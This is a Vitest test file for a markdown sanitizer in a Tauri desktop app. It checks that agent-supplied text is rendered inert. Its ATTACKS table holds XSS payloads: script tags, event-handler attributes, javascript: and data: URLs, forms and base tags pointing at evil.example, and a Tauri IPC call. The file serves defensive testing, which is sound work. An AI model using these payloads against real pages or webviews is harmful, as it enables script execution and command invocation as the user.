// @vitest-environment jsdom
//
// jsdom, not the project-wide happy-dom default, and that is load-bearing.
// Under happy-dom, DOMPurify 3.4 reports `isSupported === true` and then does
// not sanitize: `<h1>Title</h1><img src=x onerror=alert(1)>` comes back as
// `Title<img src="x" onerror="alert(1)">` -- the heading stripped, the event
// handler intact. A suite written against that environment would either fail
// for reasons that have nothing to do with the sanitizer, or, worse, be
// "fixed" by relaxing the assertions until it passed. jsdom gives DOMPurify a
// DOM it actually works against, so these tests measure markdown.ts rather
// than the test environment. Do not drop this directive.
//
// The sanitizer in markdown.ts is the only thing between agent-supplied text
// and `v-html` in a webview where `__TAURI_INTERNALS__.invoke()` is reachable
// from page script. Script execution there runs commands as the user, so a
// regression in this file is a P0, not a cosmetic bug.
//
// The attack table below was the acceptance evidence for the original fix; it
// lived in a throwaway harness, which meant nothing in the repo stopped a
// later refactor from quietly reopening the hole. It lives here now.
//
// Each attack asserts on *absence of capability* (no script tag, no event
// handler, no javascript: URL) rather than on an exact output string, so the
// tests survive a DOMPurify or marked upgrade that changes formatting without
// changing safety.

import { describe, it, expect } from 'vitest';
import { renderMarkdown } from './markdown';

/** Parse rendered output so assertions run against the DOM, not a string. */
function render(markdown: string): HTMLElement {
  const host = document.createElement('div');
  host.innerHTML = renderMarkdown(markdown);
  return host;
}

/** Every attribute name present anywhere in the rendered tree, lowercased. */
function attributeNames(root: HTMLElement): string[] {
  const names: string[] = [];
  for (const el of [root, ...Array.from(root.querySelectorAll('*'))]) {
    for (const attr of Array.from(el.attributes)) names.push(attr.name.toLowerCase());
  }
  return names;
}

/** Every href/src value in the rendered tree, lowercased and de-spaced. */
function urlValues(root: HTMLElement): string[] {
  return Array.from(root.querySelectorAll('[href], [src]')).flatMap((el) =>
    ['href', 'src']
      .map((a) => el.getAttribute(a))
      .filter((v): v is string => v !== null)
      .map((v) => v.replace(/\s/g, '').toLowerCase())
  );
}

const ATTACKS: Array<[name: string, payload: string]> = [
  ['a bare script tag', '<script>alert(1)</script>'],
  ['a script tag split by a comment', '<scr<!---->ipt>alert(1)</script>'],
  ['an uppercase script tag', '<SCRIPT>alert(1)</SCRIPT>'],
  ['an img onerror handler', '<img src=x onerror="alert(1)">'],
  ['a case-varied ONERROR handler', '<img src=x ONERROR=alert(1)>'],
  ['an onerror with no quotes or spaces', '<img/src="x"/onerror=alert(1)>'],
  ['a body onload handler', '<body onload=alert(1)>'],
  ['an svg onload handler', '<svg onload=alert(1)></svg>'],
  ['an svg with a nested script', '<svg><script>alert(1)</script></svg>'],
  ['an iframe with srcdoc', '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>'],
  ['an iframe with a javascript: src', '<iframe src="javascript:alert(1)"></iframe>'],
  ['a meta refresh redirect', '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">'],
  ['a base tag rewriting relative URLs', '<base href="https://evil.example/">'],
  ['an object data payload', '<object data="javascript:alert(1)"></object>'],
  ['an embed src payload', '<embed src="javascript:alert(1)">'],
  ['a stylesheet link', '<link rel="stylesheet" href="https://evil.example/x.css">'],
  ['a style block', '<style>body{display:none}</style>'],
  ['a style attribute overlaying app chrome', '<span style="position:fixed;inset:0;z-index:9999">x</span>'],
  ['a javascript: URL in markdown link syntax', '[click me](javascript:alert(1))'],
  ['a javascript: URL with interior whitespace', '[click me](java\tscript:alert(1))'],
  ['a javascript: URL in raw HTML', '<a href="javascript:alert(1)">click me</a>'],
  ['a data: URL carrying HTML', '<a href="data:text/html,<script>alert(1)</script>">click me</a>'],
  ['a Tauri IPC invocation', '<img src=x onerror="__TAURI_INTERNALS__.invoke(\'spawn_agent\')">'],
  ['a form posting to an attacker', '<form action="https://evil.example"><input name="p"></form>'],
  ['a details/summary toggle handler', '<details ontoggle=alert(1) open></details>'],
  ['a data-* attribute feeding app script', '<span data-agent-id="../../etc/passwd">x</span>'],
];

describe('renderMarkdown neutralises hostile agent content', () => {
  it.each(ATTACKS)('renders %s inert', (_name, payload) => {
    const out = render(payload);
    const html = out.innerHTML.toLowerCase();

    // No executable element survives.
    expect(out.querySelector('script, iframe, object, embed, style, link, meta, base, form, svg')).toBeNull();
    expect(html).not.toContain('<script');

    // No event handler attribute survives, in any casing.
    expect(attributeNames(out).filter((n) => n.startsWith('on'))).toEqual([]);
    // ...nor a data-* attribute, which feeds attacker values to app script.
    expect(attributeNames(out).filter((n) => n.startsWith('data-'))).toEqual([]);
    // ...nor `style`, the clickjacking/overlay vector.
    expect(attributeNames(out)).not.toContain('style');

    // No URL that executes on navigation.
    for (const url of urlValues(out)) {
      expect(url.startsWith('javascript:')).toBe(false);
      expect(url.startsWith('data:text/html')).toBe(false);
    }
  });

  it('drops the payload rather than merely escaping it into a live handler', () => {
    // A sanitizer that HTML-escaped instead of removing would leave the text
    // visible but harmless; what must never happen is a live attribute.
    const out = render('<img src=x onerror="alert(1)">');
    const img = out.querySelector('img');
    if (img) expect(img.hasAttribute('onerror')).toBe(false);
  });
});

describe('renderMarkdown preserves legitimate markdown', () => {
  it('renders headings, emphasis and lists', () => {
    const out = render('# Title\n\nSome **bold** and *italic*.\n\n- one\n- two\n');
    expect(out.querySelector('h1')?.textContent).toBe('Title');
    expect(out.querySelector('strong')?.textContent).toBe('bold');
    expect(out.querySelector('em')?.textContent).toBe('italic');
    expect(out.querySelectorAll('li')).toHaveLength(2);
  });

  it('renders fenced code without executing it', () => {
    const out = render('```js\nconst x = "<script>alert(1)</script>";\n```');
    const code = out.querySelector('pre code');
    expect(code).not.toBeNull();
    // The script text is present as *text*, and no script element exists.
    expect(code?.textContent).toContain('<script>alert(1)</script>');
    expect(out.querySelector('script')).toBeNull();
  });

  it('renders inline code', () => {
    const out = render('use `npm test` to run');
    expect(out.querySelector('code')?.textContent).toBe('npm test');
  });

  it('renders tables', () => {
    const out = render('| a | b |\n| --- | --- |\n| 1 | 2 |\n');
    expect(out.querySelector('table')).not.toBeNull();
    expect(out.querySelectorAll('tbody td')).toHaveLength(2);
  });

  it('keeps safe links and stamps rel on them', () => {
    const out = render('[docs](https://example.com/docs)');
    const a = out.querySelector('a');
    expect(a?.getAttribute('href')).toBe('https://example.com/docs');
    expect(a?.getAttribute('rel')).toBe('noopener noreferrer nofollow');
  });

  it('stamps rel on raw-HTML links too, not just markdown ones', () => {
    const out = render('<a href="https://example.com">x</a>');
    expect(out.querySelector('a')?.getAttribute('rel')).toBe('noopener noreferrer nofollow');
  });

  it('leaves relative and mailto links usable', () => {
    const mail = render('[mail](mailto:someone@example.com)').querySelector('a');
    expect(mail?.getAttribute('href')).toBe('mailto:someone@example.com');
  });

  it('renders blockquotes and horizontal rules', () => {
    const out = render('> quoted\n\n---\n');
    expect(out.querySelector('blockquote')?.textContent?.trim()).toBe('quoted');
    expect(out.querySelector('hr')).not.toBeNull();
  });

  it('is a pure function of its input', () => {
    const md = '# same\n\n[l](https://example.com)';
    expect(renderMarkdown(md)).toBe(renderMarkdown(md));
  });

  it('handles empty input', () => {
    expect(renderMarkdown('').trim()).toBe('');
  });
});
